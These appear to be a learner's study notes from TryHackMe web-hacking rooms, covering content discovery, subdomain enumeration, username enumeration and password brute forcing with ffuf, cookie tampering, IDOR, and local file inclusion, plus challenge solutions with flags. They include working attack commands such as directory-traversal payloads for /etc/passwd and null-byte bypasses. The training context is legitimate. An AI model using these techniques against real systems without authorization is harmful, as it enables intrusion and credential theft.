# Penetration Testing Notes

# Try Hack Me

# Intro to Web Hacking

## Walking an Application

HTML Comments 

<!-- This is an example comment-->

Look for where things are stored. Attempt to explore directories where files or images are stored.

Check page source to attempt to identify if the site is using a common framework and try to identify version and if any vulnerabilities are present. 

**Developer Tools - Inspect**

Inspect elements to be able to edit things like CSS styles. In this lab you can edit the CSS style block to none to remove the payall

**Developer Tools - Debugger**
Called Sources in Google Chrome

Clicking {} at the bottom of the debugger enable pretty print and makes the javascript more readable. 

If you click the line number you insert a break point, this tells the website to stop before this line of code. 

In this lab if you insert the breakpoint

**Developer Tools -Network**

Keeps track of every external web request. Check the requests and their responses.

## Content Discovery

Manual, Automated, and OSINT

### Manual Discovery - Robots.txt

Viewing the robots.txt can show you which parts of the site are not indexed by search engines. 

Example: 

Disallow: /staff-portal

### Manual Discovery - Favicon

Can be used to identify framework used if not updated by developer

OWASP has a database of favicon icons to identify - https://wiki.owasp.org/index.php/OWASP_favicon_database

This uses md5 hashes to identify the framework used

Use curl "FAVICON ADDRESS" | md5sum to get the hash. Search on OWASP database to identify framework.

### Manual Discovery - Sitemap.xml

Lists every file website owner wants listed in search engines.

Check sitemap for areas of the website that may not be publically available or suspicious, curious areas.

### Manual Discovery - HTTP Headers

Headers can sometimes include useful information, webserver software/programming language used. Can be used to find vulnerable versions.

Run curl "SITE ADDRESS" -v

### Manual Discovery - Framework Stack

Either by comments in the page source or by the favicon, once the framework is discovered that can be used to find ways to exploit. In this lab the method was to review the documentaiton for the administrator login page and test default credentials that hadn't been changed. 

### OSINT - Google Hacking / Dorking

**Examples**

site
	site:tryhackme.com
	returns results only from the specified website address
inurl
	inurl:admin
	returns results that have the specified word in the URL
filetype
	filetype:pdf
	returns results which are a particular file extension
intitle
	intitle:admin
	returns results that contain the specified word in the title

### OSINT - Wappalyzer

Online tool and browser extension to identify what technologies a website uses, such as frameworks CMS and more. 

### OSINT - Wayback Machine

Utilize this to discover old pages that may still be active on the website. 

### OSINT - Github

Search for repo's for companies you are targeting. See what information you can uncover, passwords, source code, etc. 

### OSINT - S3 Buckets

S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.

### Automated Discovery

Worlists. 

#### Tools

These tools can be used to automate discovery. You can import common wordlists and scan websites for directories or files that exist in the wordlists. See the tools below:

**ffuf**
  
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.77.145/FUZZ    

**dirb**
          
dirb http://10.10.77.145/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt  
      
**Gobuster**
           
gobuster dir --url http://10.10.77.145/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

## Subdomain Enumeration

Methods: Brute Force, OSINT (Open-Source Intelligence) and Virtual Host

### OSINT - SSL/TLS Certificates

Certificate Transparency Logs - Public logs of every SSL/TLS certificate created for domain name. 

Use to advantage to discover subdomains belonging to domain. Sites like https://crt.sh and https://ui.ctsearch.entrust.com/ui/ctsearchui 

### OSINT - Search Engines

Google dorking - discover subdomains

site:*tryhackme.com

### DNS Bruteforce

Try a large number of different possibilities from a pre-defined list of commonly used subdomains. Automated with tools. DNSrecon request

### OSINT Sublist3r

Automated discovery using Sublist3r.

### Virtual Hosts

Tools like ffuf can be used to automate subdomain disovery for virtual hosts. Need to eliminate false positives, run command and identify most common size of request and filter out.

Examples:

ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.94.145

Most common size from this request was 2395

ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.94.145 -fs 2395

Discovered two positive results after filtering out false positives.

### Authentication Bypass

Ways website authentication methods can be bypassed

Creating a list of valid usernames. You can use account registration pages to try common account names, errors can reveal that an account with that name already exists. 

admin

ffuf can be used to automate and build a list of valid usernames by using a wordlist. 

ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.197.96/customers/signup -mr "username already exists"

-w selects the wordlist
-x specifies request method, GET is default. When filling the form this is a POST request
-d specifies the data you send we have the fields username, email, password and cpassword.
-H adds addaitonal header sto request, this case setting Content-Type so the web server knows we are sending form data.
-mr uses regex to identify the text on the page used to validate a valid username

admin, robert, steve, simon

### Brute Force

Brute forcing w/ fuff, using the valid_usernames.txt file that we created with the valid usernames enumerated in the prior step

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.197.96/customers/login -fc 200

W1 is the first keyword used to insert the valid username
W2 is the list of passwords
-w argument is used and word lists are separated with a comma

-fc argument is used to check for an HTTP status code other than 200

302 was the status when a username was found

steve/thunder

### Logic Flaw

When a typical logical path of an application is bypassed, circumvented or manipulated by a hacker. 

Exploit reset password function on test site

## Cookie Tampering

curl http://10.10.165.162/cookie-test
- Returns not logged in

curl -H "Cookie: logged_in=true; admin=false" http://10.10.165.162/cookie-test

- The -H flag adds teh coockie header that we manipulated
- Receives message stating Logged in As A User

### Hash cracking

crackstation.net

## IDOR

Insecure Direct Objec Reference - type of access control vulnerability

### Encoding

base64 is often used to encode web data. You can decode, manipulate, and encode. Often end in a =

### Hashing

Things can also be hashed, when a hash is discovered its worthy runing through crackstation.net to see if they have the cracked hash

### Unpredicatble IDs 

If you cant decode or crack the hash of a user id for example you can create a test account and attempt to swap the id of the test account with the true account. If you can view the toehrs content you found an IDOR. 

### Where IDORs are located?

Might be in an AJAX request or something referenced in a Javascript file. 

### Practical IDOR example

Check get request for items like userids, try to manipulate ids to get information such as account names and emails. 

This could be used to enhance a brute force attack or password spraying attack.

## File Inclusion

Local File Inclusion, Remote File Inclusion, and directory traversal.

### Lab 1 - Local File Inclusion

PHP functions such as include, require, include_once, and require_once contribute to vulnerable we applications. 

http://10.10.215.91/lab2.php?file=test.php

This request can be manipulated. Test the ../ vulnerability, try to get things like /etc/passwd or moving around directories

Null bytes can be used to bypass input that has defined input at the end. Tricks web applications into discarding everything after the null byte. 

**%00** or **0x00** in hex

PHP was used in this lab along with the file_get_contents and includes function. 

Sending invalid data was used to reveal error codes that showed how the data was being processed. 

../../../../etc/passwd could be used as a payload, an example of directory traversal. 

Sometimes the app would apply .php to the end of any input the null byte was used to bypass this, make sure to try in request bar or developer tools

Pay attention to how the data is being passed, it was filtered in some instances, doubleing things could bypass a filter for example ../ could be filtered and removed, in this case ....// was used as the initial ../ was stripped out. 

## Remote File Inclusion - RFI

Allows an attacker to inject external URL into include function. One requirement for RFI is that the allow_url_fopen needs to be on. Allows RCE


## Chalenges

### Challenge 1

Capture Flag1 at /etc/flag1

The input form is broken so we have to use manual curl requests

curl -x POST [options] [URL] - curl request format

The challenge tells us that the form is broken and we need to send a curl request with the 'file' parameter.

- Researched how to send CURL requests
- Sent a test curl request
  - curl -X POST -d 'file=test.php' http://10.10.221.7/challenges/chall1.php
    - Got a response from the server, showed the PHP include function
- Sent a 2nd curl request attempting to traverse directories to /etc/flag1
  - curl -X POST -d 'file=../../../../etc/flag1' http://10.10.221.7/challenges/chall1.php
    - flag was `F1x3d-iNpu7-f0rrn`

### Challenge 2

Capture the Flag2 at /etc/flag2

- Sending the same curl request but with flag 2 results in the webiste saying flag 2 is not allowed
  - Attempted to bypass filtering, didnt change anything, just got an error. Likely not a filter
  - Hint in try hack me says to check cookies
  - Changed cookie Name: THM value to Admin, received a Welcome Admin message, manually using dev tools
    - I had to look this one up. 
  - When dealing with pages that are authenticated it is important to check the cookie. The cookie can also be used to perform directory traversal
    - Change cookie value to ../../../../etc/flag2 and you will notice it is adding .php
    - Use the null byte %00 and send ../../../etc/flag2%00 and you will get the flag








































### Who broke my lock?

Goal: Bruteforce Administrators Password

1. Capture logon request via burb
2. Insert position for password
3. Load wordlist
4. Run Sniper attack to bruteforce password
   1. Wait for Sniper to finish
      1. Response code 200 (succes) received for password "admin123" with username admin@juice-sh.op

### AH! Dont' Look

Goal: Access the confidential document

FTP directory is exposed to public and is shown due to linking a file in About us page. Navigate to SITEIP/ftp and downloaded confidential file. 

Goal 2: Log into MC SafeSearch's account

Goal 3: Download the Backup file

Need to use a character bypass called Poinson Null Byte - %00 - URL encoded %2500